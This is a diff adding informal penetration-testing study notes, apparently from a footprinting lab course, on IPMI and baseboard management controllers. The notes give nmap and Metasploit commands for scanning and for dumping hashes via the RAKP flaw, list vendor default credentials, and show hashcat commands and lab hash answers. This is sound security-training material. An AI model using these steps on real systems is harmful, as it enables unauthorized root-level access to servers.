@@ -1020,3 +1020,50 @@ $curl -X GET http://10.129.204.235/testing.txt
 \\IPMI=====================================================================
 Intelligent Platform Management Interface is a set of standardized specifications for hardware-based host management systems used to system management and monitoring. it acts as an autonomous subsystem and works independently of the host's BIOS,CPU, firmware and underlying OS.
 -IPMI provides sysadmins wih the ability to manage and monitor systems even if they are powered off or in an unresponsive state.
+-it operate using a direct network connection to the system hardware and does not require access to the OS via a login shell. IPMI can also used for remote upgrades to system without physical access to the target host IPMI is typically used in 3 ways:
++Before the OS hash booted to modify BIOS settings
++when the host is fully powered down 
++Access to a host after a system failure
+-when not being used for these tasks, IPMI can monitor a range of diff things such as system temperature, voltage, fan status, and powersupplies. it can also be used for querying inventory informaation, retrieve hardware logs, and alerting using SNMP. the host system can be powered off, but the IPMI module requires a power source and a LAN conn to work correctly
+-IPMI protocol first public 1998
+\\Footprinting the service
+IPMI comm over port 623 UDP,system that use the IPMI pro are called Baseboard management controller (BMCs)
+-BMCs are typically imple are embeded ARM system running linux and conn direc to the host's motherboard. BMC are built into many motherboard but can also be added to a system as a PCi carried
+-Most server either comewith BMC or support adding BMC, the mist common BMCs often see during internal penetration tests are HP iLO, Dell DRAC, andSupermicro IPMI.
+-if we can access BMC during pentest we would gain full access to the host motherboard and be able to monitor, reboot, poweroff, or even reinstall the host OS. gaining access to BMC is nearly equivalent to physical access to a system
+-may BMCs expose a web-based management console,some sort of command line remote access pro such as Telnet or SSH, and the port 623UDP,
+\\Nmap
+$sudo nmap -sU --script ipmi-version -p 623 ilo.inlanefreight.local
+\\Metasploit Version scan
+https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/
+msf6>use auxiliary/scanner/ipmi/ipmi_version
+>set rhosts 10.129.43.195  >show options >run
+-during internal pentest, we often find BMCs where the admin have not changed the default password, some unique default passwords to keep in our cheatsheets include:
+Product	Username	Password
+Dell iDRAC	root	calvin
+HP iLO	Administrator	randomized 8-character string consisting of numbers and uppercase letters
+Supermicro IPMI	ADMIN	ADMIN
+->it worth to try default pwd for nay service found,
+\\Dangerous Setting
+if default credential note work > turn to a flaw in the RAKP protocol in IPMI 2.0 during the authen process
+http://fish2.com/ipmi/remote-pw-cracking.html
+-during the authen process the server sends a salted SHA1 or MD5 hash of the user password to the client defore authen take place. this can be leveraged to obtain the pwd hash for ANY valid user account on the BMC. these pwd hashes can then be cracked  offline using a dictionany attack using hashcat mode 7300. 
+-in the even of an HP iLO using a factory default pwd, we can use this hashcat mask atk command
+$hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which try all combinations of upper case letter and number for an eight-character password
+-these is no direct fix to this issues because the flaw is a critical comp of the IPMI specification. client can opt for very long, diff to crack pwd or implement network segmentation rules to restrict he direct access to the BMCs.
+-gain web console BMC is high risk finding but we have seen envi where a unique pwd is set that is later re0used
+-on one such pentest, we obtained an IPMI hash, cracked it offline using Hashcatm and were able to SSH into many critical servers in the envi as the root user and gain access to web management consoles for various network monitoring tools
+-to retrieve IPMI hash we can use the Metasploit: 
+https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
+msf6>use auxiliary/scanner/ipmi/ipmi_dumphashes >set rhosts 10.129.42.195 >show options  >run
+-> found admin hash > crack > get pwd
+-checking IPMI should be part of internal penetration test playbook for any environment we dinf ourselves assessing
+<test>What username is configured for accessing the host via IPMI? 10.129.94.58
+$sudo nmap -sU --script ipmi-version -p 623 <ip>
+msf6>use auxiliary/scanner/ipmi/ipmi_dumphashes >set rhosts 10.129.42.195 >show options  >run
+7babe4ec82000000451540fb879fcbc0ad3489fde7cdd5e9b39d9aa5fc94d1ec8df623aad248d8c5a123456789abcdefa123456789abcdef140561646d696e:b5a5f2ffd47e1e1a0187b30f1088e35a6a9792b9
+
+<test>What is the account's cleartext password?
+
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u --username
+hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt
